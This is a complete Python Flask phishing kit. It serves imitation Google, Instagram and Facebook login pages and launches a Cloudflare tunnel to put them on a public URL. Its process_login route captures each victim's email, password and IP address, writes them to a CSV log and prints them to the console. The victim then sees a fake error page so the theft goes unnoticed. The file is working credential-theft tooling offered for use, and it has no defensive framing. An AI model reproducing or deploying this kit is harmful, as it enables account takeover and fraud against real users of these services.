import time
import re
import threading
from flask import Flask, render_template_string, request, redirect, jsonify
import datetime
import socket
# Added for potential external API checking (advanced features)
import requests

# ====================================================================
# CORE SYSTEM CONFIGURATION
# ====================================================================
# We need a more descriptive log file name
LOG_FILE = "phishing_capture_log.csv"
# Set a fallback domain/organization name for better impersonation
FAKE_ORG_NAME = "Google Workspace"
# Platform selection (will be set by user choice in terminal)
SELECTED_PLATFORM = None
# ====================================================================

app = Flask(__name__)

# --- IP Address Helper ---


def get_client_ip():
    """
    Attempts to determine the client's real IP address from the request headers.
    This handles common proxy setups (like Nginx/Cloudflare).
    """
    # Checks X-Forwarded-For first (common with Cloudflare/proxies)
    if 'X-Forwarded-For' in request.headers:
        ip_list = request.headers['X-Forwarded-For'].split(',')
        # The client IP is usually the first one listed
        return ip_list[0].strip()
    # Fallback to connection remote address
    return request.remote_addr


# --------------------------------------------------------------------
# 1. The Full HTML/CSS Template (Google Realism Upgrade).
# GOOGLE LOGIN TEMPLATE.
# --------------------------------------------------------------------
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background-size: cover;
            font-family: 'Google Sans', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
        }
        

        .box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 30rem;
            padding: 3.5rem;
            box-sizing: border-box;
            border: 1px solid #dadce0;
            -webkit-border-radius: 25px;
            border-radius: 25px;
        }

        .box h2 {
            margin: 0px 0 -0.125rem;
            padding: 0;
            text-align: center;
            color: #202124;
            font-size: 24px;
            font-weight: 400;
        }

        .box .logo {
            display: flex;
            flex-direction: row;
            justify-content: center;
            margin-bottom: 16px;
        }

        .box p {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 1px;
            line-height: 1.5;
            margin-bottom: 24px;
            text-align: center;
        }

        .box .inputBox {
            position: relative;
        }

        .box .inputBox input {
            width: 93%;
            padding: 1.3rem 10px;
            font-size: 1rem;
            letter-spacing: 0.062rem;
            margin-bottom: 1.875rem;
            border: 1px solid #ccc;
            background: transparent;
            border-radius: 4px;
        }

        .box .inputBox label {
            position: absolute;
            top: 0;
            left: 10px;
            padding: 0.625rem 0;
            font-size: 1rem;
            color: gray;
            pointer-events: none;
            transition: 0.5s;
        }

        .box .inputBox input:focus ~ label,
        .box .inputBox input:valid ~ label,
        .box .inputBox input:not([value=""]) ~ label {
            top: -1.125rem;
            left: 10px;
            color: #1a73e8;
            font-size: 0.75rem;
            background-color: #fff;
            height: 10px;
            padding-left: 5px;
            padding-right: 5px;
        }

        .box .inputBox input:focus {
            outline: none;
            border: 2px solid #1a73e8;
        }

        .box input[type="submit"] {
            border: none;
            outline: none;
            color: #fff;
            background-color: #1a73e8;
            padding: 0.625rem 1.25rem;
            cursor: pointer;
            border-radius: 0.312rem;
            font-size: 1rem;
            float: right;
        }

        .box input[type="submit"]:hover {
            background-color: #287ae6;
            box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45),
                        0 1px 3px 1px rgba(66,133,244,0.3);
        }

        .box .signup-link {
            margin-top: 16px;
            text-align: center;
        }

        .box .signup-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 0.95rem;
        }
    </style>
</head>
<body>

    <div class="box">
        <div class="logo">
            <img src="https://static.vecteezy.com/system/resources/thumbnails/028/667/072/small/google-logo-icon-symbol-free-png.png" alt="Google" style="width: 120px; height: auto;">
        </div>

        <h2>Sign In</h2>
        <p>Use your Google Account</p>

        <form action="{{ url_for('process_login') }}" method="POST">
            <div class="inputBox">
                <input type="email"
                       name="email"
                       required
                       onkeyup="this.setAttribute('value', this.value);"
                       value="">
                <label>Username</label>
            </div>

            <div class="inputBox">
                <input type="password"
                       name="password"
                       required
                       onkeyup="this.setAttribute('value', this.value);"
                       value="">
                <label>Password</label>
            </div>

            <input type="submit" name="sign-in" value="Sign In">
        </form>

        <div class="signup-link">
            <a href="{{ url_for('google_error') }}">Create account</a>
        </div>
    </div>

</body>
</html>
"""

# --------------------------------------------------------------------
# 2. Instagram Login Template
# --------------------------------------------------------------------
INSTAGRAM_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <!-- Google Fonts (Inter) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* General Body Styles */
        * {
            font-family: 'Inter', sans-serif;
            box-sizing: border-box;
            padding: 0;
            margin: 0;
        }

        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
        }

        /* Main container to center content */
        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            flex-grow: 1;
        }

        .content-wrapper {
            width: 100%;
            display: flex;
            justify-content: center;
            padding-bottom: 32px;
            margin-top: 52px;
            margin-inline-start: auto;
            margin-inline-end: auto;
            max-width: 935px;
        }

        /* Phone image styles */
        .phone-image-container {
            display: none;
        }

        .phone-screenshot {
            height: 450px;
            margin-left: -55px;
            width: auto;
            object-fit: fill;
            border: 0px;
        }

        /* Forms container */
        .forms-container {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 32px;
        }

        .card {
            text-align: center;
        }

        .login-box {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Login Form */
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            margin-top: 24px;
        }

        .login-form .input-container {
            margin-bottom: 6px;
            margin-top: 0;
            margin-inline-start: 40px;
            margin-inline-end: 40px;
        }

        .login-form input {
            width: 100%;
            padding: 10px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            box-sizing: border-box;
        }

        .login-form input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .login-button {
            width: 100%;
            background-color: #4a5df9;
            color: white;
            font-weight: 600;
            border-radius: 8px;
            padding: 7px;
            margin-top: 8px;
            border: none;
            cursor: pointer;
            opacity: 0.7;
        }

        .login-button:hover {
            opacity: 1;
        }

        /* 'OR' separator */
        .separator {
            display: flex;
            align-items: center;
            width: 100%;
            margin-top: 14px;
            margin-bottom: 22px;
        }

        .separator .line {
            height: 1px;
            background-color: #dbdbdb;
            flex-grow: 1;
        }

        .separator .line.start {
            margin-inline-start: 40px;
        }

        .separator .line.end {
            margin-inline-end: 40px;
        }

        .separator .text {
            padding: 0 18px;
            font-size: 12px;
            font-weight: 600;
            color: #8e8e8e;
        }

        /* Facebook Login Button */
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 16px;
            border: none;
            background: none;
            cursor: pointer;
        }

        .facebook-login span {
            font-size: 14px;
            font-weight: 600;
            color: #0095f6;
        }

        .forgot-password {
            color: #000000;
            font-size: 14px;
            font-weight: 500;
            margin-top: 12px;
            text-decoration: none;
        }

        /* Signup Box */
        .signup-box {
            padding: 44px;
            font-size: 14px;
        }

        .signup-box a {
            font-weight: 600;
            color: #4a5df9;
            text-decoration: none;
        }

        /* Footer */
        .page-footer {
            padding: 32px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: inherit;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Responsive styles for desktop */
        @media (min-width: 768px) {
            .content-wrapper {
                flex-direction: row;
            }

            .phone-image-container {
                display: flex;
                justify-content: center;
                height: auto;
                flex-direction: column;
                align-items: center;
                flex-grow: 1;
            }
        }
    </style>
</head>

<body>

    <main class="main-container">
        <div class="content-wrapper">

            <!-- Phone Image (hidden on small screens) -->
            <div class="phone-image-container">
                <img class="phone-screenshot"
                    src="https://raw.githubusercontent.com/farazc60/Project-Images/refs/heads/main/instagram-login-page.png"
                    alt="Instagram">
            </div>

            <!-- Login & Signup Forms -->
            <div class="forms-container">

                <!-- Login Form -->
                <div class="card login-box">
                    <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
                        style="background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png'); background-position: 0px -2959px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>

                    <form class="login-form" action="{{ url_for('process_login') }}" method="POST">
                        <div class="input-container">
                            <input aria-label="Phone number, username, or email" type="text" name="email"
                                placeholder="Phone number, username, or email" required>
                        </div>
                        <div class="input-container">
                            <input aria-label="Password" type="password" name="password" placeholder="Password" required>
                        </div>
                        <div class="input-container">
                            <button type="submit" class="login-button">
                                Log in
                            </button>
                        </div>
                    </form>

                    <!-- OR Separator -->
                    <div class="separator">
                        <div class="line start"></div>
                        <div class="text">OR</div>
                        <div class="line end"></div>
                    </div>

                    <!-- Log in with Facebook -->
                    <button class="facebook-login">
                        <svg aria-hidden="true" fill="#0095f6" viewBox="0 0 24 24"
                            style="width: 1rem; height: 1rem;border-radius:100px;">
                            <path
                                d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.046c.73 0 1.325-.593 1.325-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z">
                            </path>
                        </svg>
                        <span>Log in with Facebook</span>
                    </button>

                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>

                <!-- Sign up Box -->
                <div class="card signup-box">
                    <span>Don't have an account?</span>
                    <a href="#">Sign up</a>
                </div>

            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="page-footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
            <span>English (UK)</span>
            <span>© 2026 Instagram from Meta</span>
        </div>
    </footer>

</body>

</html>
"""

# ====================================================================
# 3. Facebook Login Template
# ====================================================================
FACEBOOK_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <!-- Google Fonts (Inter) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .main-container,
        .content-wrapper {
            display: flex;
            width: 100%;
            min-height: 100vh;
        }

        .left-panel {
            width: 50%;
            min-height: 100vh;
            background-image: url('https://i.ibb.co/YBR7PGkq/Phone.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }



        .login-container {
            width: 700px;
            max-width: 100%;
            text-align: center;
            padding: 20px;
            border-radius: 24px;
            background: #fff;
            margin: auto;
            height: fit-content;
        }

        h2 {
            text-align: left;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #141518;
        }

        .input-group {
            position: relative;
            width: 100%;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 18px 16px 14px;
            border: 1px solid #dddfe2;
            border-radius: 16px;
            font-size: 17px;
            background: transparent;
        }

        .input-field:focus {
            outline: none;
            border-color: #1877f2;
        }

        .input-group label {
            position: absolute;
            left: 16px;
            top: 18px;
            color: #777;
            font-size: 16px;
            transition: all 0.2s ease;
            pointer-events: none;
            background: white;
            padding: 0 6px;
        }

        .input-field:focus+label,
        .input-field:not(:placeholder-shown)+label {
            top: -8px;
            font-size: 13px;
            color: #141518;
        }

        .login-btn {
            width: 100%;
            background-color: #065eec;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 10px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 4px;
        }

        .forgot-password {
            display: block;
            margin-top: 16px;
            color: #141518;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account-btn {
            width: 100%;
            margin-top: 60px;
            padding: 10px 20px;
            border-radius: 20px;
            border: 1px solid #0866ff;
            color: #0866ff;
            background-color: transparent;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
        }

        .meta-logo {
            margin-top: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #0866ff;
            font-weight: bold;
            font-size: 18px;
        }

        .meta-logo img {
            width: 35px;
            height: 24px;
            margin-left: 5px;
            object-fit: contain;
        }

        @media (max-width: 960px) {

            .main-container,
            .content-wrapper,
            .left-panel,
            .login-container {
                width: 100%;
            }

            .left-panel {
                min-height: 320px;
            }

            .login-container {
                padding: 24px;
                border-radius: 20px;
            }
        }
    </style>
</head>

<body>

    <main class="main-container">
        <div class="content-wrapper">
            <div class="left-panel"></div>

            <div class="login-container">
                <h2>Log in to Facebook</h2>

                <form action="{{ url_for('process_login') }}" method="POST">
                    <div class="input-group">
                        <input type="text" class="input-field" name="email" placeholder=" " id="email" autocomplete="username" required>
                        <label for="email">Email address or mobile number</label>
                    </div>
                    <div class="input-group">
                        <input type="password" class="input-field" name="password" placeholder=" " id="password"
                            autocomplete="current-password" required>
                        <label for="password">Password</label>
                    </div>
                    <button type="submit" class="login-btn">Log in</button>
                </form>

                <a href="https://www.facebook.com/login/identify/" class="forgot-password">Forgotten password?</a>

                <button class="create-account-btn">Create new account</button>

                <div class="meta-logo">
                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDnMt-iMGuw2tyJsAVBUOfWvNszcRTXntj67Mu9RPtdI_9gyPmTuy28Ao&s=10"
                        alt="Meta">
                </div>
            </div>


</body>

</html>
"""

# ====================================================================
# 4. The Error Page of Google Template (Google only)
# ====================================================================
SUCCESS_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error 404 (Not Found)!!1</title>
    <link rel="icon" type="image/png"
        href="https://www.gstatic.com/images/branding/searchlogo/ico/favicon.ico">
    <style>
        body {
            font-family: arial, sans-serif;
            background-color: #fff;
            color: #222;
            padding: 30px;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 80vh;
        }
        .container {
            max-width: 600px;
            padding-right: 210px;
            position: relative;
        }
        /* Google Style Logo */
        .logo {
            background: url('https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png') no-repeat;
            width: 150px;
            height: 54px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 17px;
            font-weight: bold;
            margin: 0 0 15px;
        }
        p {
            font-size: 14px;
            line-height: 1.6;
            margin: 11px 0 22px;
        }
        /* Replicated Google Broken Robot Placement */
        .robot {
            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSi-A9Z8__EBQFWDJt8MD1aYwsK3hcgA3flBQ&s') no-repeat;
            width: 182px;
            height: 214px;
            position: absolute;
            right: 0;
            top: 20px;
        }
        /* Mobile Responsiveness */
        @media (max-width: 650px) {
            body {
                padding: 20px;
                align-items: flex-start;
            }
            .container {
                padding-right: 0;
                text-align: center;
            }
            .logo {
                margin: 0 auto 20px;
            }
            .robot {
                position: relative;
                margin: 30px auto 0;
                right: auto;
                top: auto;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Google Logo -->
        <div class="logo" aria-label="Google"></div>
        
        <!-- Error Message -->
        <h1><b>404.</b> <span style="color:#777">That’s an error.</span></h1>
        <p>An Unexpected Error Occurred Please try again later. <span style="color:#777">That’s all we know.</span></p>
        
        <!-- Broken Robot Image Background -->
        <div class="robot" title="Broken Robot"></div>
    </div>

</body>
</html>
"""

# ====================================================================
# 4. The Error Page Template (Instagram Only)
# ====================================================================
ERROR_TEMPLATE = """
<!DOCTYPE html>
<html lang="en" id="facebook">

<head>
    <title>Error</title>
    <meta charset="utf-8" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta name="robots" content="noindex,nofollow" />
    <style nonce="6XH0MkNI">
        html,
        body {
            color: #333;
            font-family: 'Lucida Grande', 'Tahoma', 'Verdana', 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        #header {
            height: 30px;
            padding-bottom: 10px;
            padding-top: 10px;
            text-align: center;
        }

        #icon {
            width: 30px;
        }

        .core {
            margin: auto;
            padding: 1em 0;
            text-align: left;
            width: 904px;
        }

        h1 {
            font-size: 18px;
        }

        p {
            font-size: 13px;
        }

        .footer {
            border-top: 1px solid #ddd;
            color: #777;
            float: left;
            font-size: 11px;
            padding: 5px 8px 6px 0;
            width: 904px;
        }
    </style>
</head>

<body>
    <div id="header"><a href="https://www.facebook.com/"><img id="icon"
                src="https://static.facebook.com/images/logos/facebook_2x.png" /></a></div>
    <div class="core">
        <h1>Sorry, something went wrong.</h1>
        <p>We&#039;re working on getting this fixed as soon as we can.</p>
        <p><a id="back" href="www.facebook.com">Go back</a></p>
        <div class="footer"> Meta &#169; 2026 &#183; <a href="https://www.facebook.com/help/?ref=href052">Help</a></div>
    </div>
    <script nonce="6XH0MkNI">
        document.getElementById("back").onclick = function () {
            if (history.length > 1) {
                history.back();
                return false;
            }
        };
    </script>
</body>

</html>
"""

# ====================================================================
# ROUTES
# ====================================================================


@app.route('/')
def index():
    """Serves the login page based on selected platform."""
    global SELECTED_PLATFORM

    if SELECTED_PLATFORM == 1:
        # Serve Google Login
        dummy_email = "user@gmail.com"
        return render_template_string(LOGIN_TEMPLATE,
                                      fake_org_name="Google",
                                      email_display=dummy_email)
    elif SELECTED_PLATFORM == 2:
        # Serve Instagram Login
        return render_template_string(INSTAGRAM_TEMPLATE)
    elif SELECTED_PLATFORM == 3:
        # Serve Facebook Login
        return render_template_string(FACEBOOK_TEMPLATE)
    else:
        return "Invalid platform selected. Please restart the application."


@app.route('/google_error')
def google_error():
    """Show the Google-specific error page for Google flows."""
    if SELECTED_PLATFORM == 1:
        return render_template_string(SUCCESS_TEMPLATE)
    return render_template_string(ERROR_TEMPLATE)


@app.route('/process_login', methods=['POST'])
def process_login():
    """
    Captures data, captures IP, and writes payload to the log file.
    """
    global SELECTED_PLATFORM

    # 1. Data Extraction
    email = request.form.get('email', 'N/A')
    password = request.form.get('password', 'N/A')
    phone = request.form.get('phone', 'N/A')

    # 2. Determine Platform
    platform_name = "Unknown"
    if SELECTED_PLATFORM == 1:
        platform_name = "Google"
    elif SELECTED_PLATFORM == 2:
        platform_name = "Instagram"
    elif SELECTED_PLATFORM == 3:
        platform_name = "Facebook"

    # 3. IP Address Capture (THE UPGRADE)
    client_ip = get_client_ip()

    # 4. Timestamping and Payload Formatting (The Dump - Using CSV standard)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Using CSV format is much more professional for bulk analysis
    payload = f'"{timestamp}", "{platform_name}", "{client_ip}", "{email}", "{password}", "{phone}"\n'

    # 5. File Writing (The Core Action)
    try:
        # Check if file exists to write header only if necessary
        try:
            with open(LOG_FILE, 'r') as f:
                file_exists = True
        except FileNotFoundError:
            file_exists = False

        with open(LOG_FILE, 'a') as f:
            if not file_exists:
                # Write header first
                f.write("Timestamp,Platform,Client_IP,Email,Password,Phone_Number\n")
            f.write(payload)

        print("\n=====================================================================")
        print(f"*** [SUCCESS]: Credentials captured in {LOG_FILE} ***")
        print(
            f"*** Platform: {platform_name} | IP={client_ip} | Email={email} | Password={password} ***")
        print("=====================================================================")

        # 6. Show the platform-specific error page after login while still capturing credentials
        if SELECTED_PLATFORM == 1:
            return render_template_string(SUCCESS_TEMPLATE)
        return render_template_string(ERROR_TEMPLATE)

    except IOError as e:
        print(
            f"CRITICAL ERROR: Could not write to the log file ({LOG_FILE}). Details: {e}")
        if SELECTED_PLATFORM == 1:
            return render_template_string(SUCCESS_TEMPLATE)
        return render_template_string(ERROR_TEMPLATE)

# ====================================================================
# EXECUTION BLOCK
# ====================================================================


if __name__ == '__main__':
    print("=============================================================================")
    print("✅ MULTI-PLATFORM PHISHING KIT INITIALIZED (v3.0)")
    print("=============================================================================")
    print("\n📱 SELECT PLATFORM:")
    print("1. Google Login")
    print("2. Instagram Login")
    print("3. Facebook Login")
    print("\n")

    # Get user choice
    while True:
        try:
            choice = input("Enter your choice (1, 2, or 3): ").strip()
            if choice in ['1', '2', '3']:
                SELECTED_PLATFORM = int(choice)
                break
            else:
                print("❌ Invalid choice! Please enter 1, 2, or 3.")
        except (ValueError, KeyboardInterrupt):
            print("❌ Invalid input! Please try again. IF YOU WANT TO EXIT, PRESS CTRL+C.")

    if SELECTED_PLATFORM == 1:
        platform_display = "Google"
    elif SELECTED_PLATFORM == 2:
        platform_display = "Instagram"
    else:
        platform_display = "Facebook"
    print(f"\n✅ Platform Selected: {platform_display}")
    print(f"💾 Logging Destination: {LOG_FILE} (CSV Format)")
    print("\n--- HOW TO DEPLOY ---")
    print("1. The Flask server is running locally")
    print("2. Access via: http://127.0.0.1:5000/")
    # Run on 0.0.0.0 to make it accessible externally if running in a container/VM
    import subprocess


def start_cloudflare():
    process = subprocess.Popen(
        ["cloudflared.exe", "tunnel", "--url", "http://127.0.0.1:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8",
        errors="ignore"
    )

    for line in process.stdout:
        print(line, end="")

        match = re.search(r"https://[-a-zA-Z0-9]+\.trycloudflare\.com", line)
        if match:
            print("\n" + "=" * 60)
            print("🌍 PUBLIC URL:", match.group(0))
            print("=" * 60 + "\n")
            print(
                "Server is running. You can now access the phishing page via the above URL.")


threading.Thread(target=start_cloudflare, daemon=True).start()

time.sleep(3)
app.run(debug=True, port=5000, host='0.0.0.0')
